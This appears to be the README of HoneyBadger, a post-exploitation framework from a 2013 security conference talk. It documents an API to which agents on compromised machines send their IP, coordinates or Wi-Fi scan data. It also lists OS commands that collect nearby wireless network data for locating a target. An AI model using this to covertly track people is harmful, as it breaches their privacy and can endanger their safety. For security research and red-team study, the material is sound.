A framework for targeted geolocation.

As seen in the presentation "Hide and Seek: Post-Exploitation Style" from ShmooCon 2013.

Associated Metasploit Framework modules can be found [here](https://github.com/v10l3nt/metasploit-framework/tree/master/modules/auxiliary/badger).

Basic HoneyBadger API
---------------------

### IP Geolocation

This method geolocates the target based on the source IP of the request and assigns the resolved location to the given target and agent.

Example:

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>```

### Known Coordinates

This method accepts previously resolved location data for the given target and agent.

Example:

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>&lat=<latitude>&lng=<longitude>&acc=<accuracy>```

### Wireless Survey

This method accepts wireless survey data and parses the information on the server-side, extracting what is needed to make a Google API geolocation call. The resolved geolocation data is then assigned to the given target and agent. Parsers currently exist for survey data from Windows, Linux and OS X using the following commands:

Windows:

```cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"```

Linux:

```/bin/sh -c iwlist scan | egrep 'Address|ESSID|Signal'```

OS X:

```/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s```

Example:

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>&os=<operating_system>&data=<base64_data>```

### Universal Parameters

All requests can include an optional "comment" parameter. This parameter is sanitized and displayed within the UI as miscellaneous information about the target or agent.
